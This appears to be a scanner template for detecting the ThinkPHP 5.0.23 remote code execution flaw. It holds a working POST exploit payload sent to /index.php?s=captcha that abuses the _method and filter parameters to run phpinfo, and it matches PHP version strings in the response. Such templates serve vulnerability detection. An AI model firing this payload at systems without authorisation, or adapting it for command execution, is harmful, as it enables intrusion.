id: thinkphp-5023-rce
brief:
    title: ThinkPHP 5.0.23 - Remote Code Execution
    by: dr_set
    level: critical
    about: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without enter...
    label:
        - thinkphp
        - rce
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/index.php?s=captcha'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
      signs:
        - "on": word
          has:
            - PHP Extension
            - PHP Version
            - ThinkPHP
          in: body
          need: all
        - "on": status
          status:
            - 200
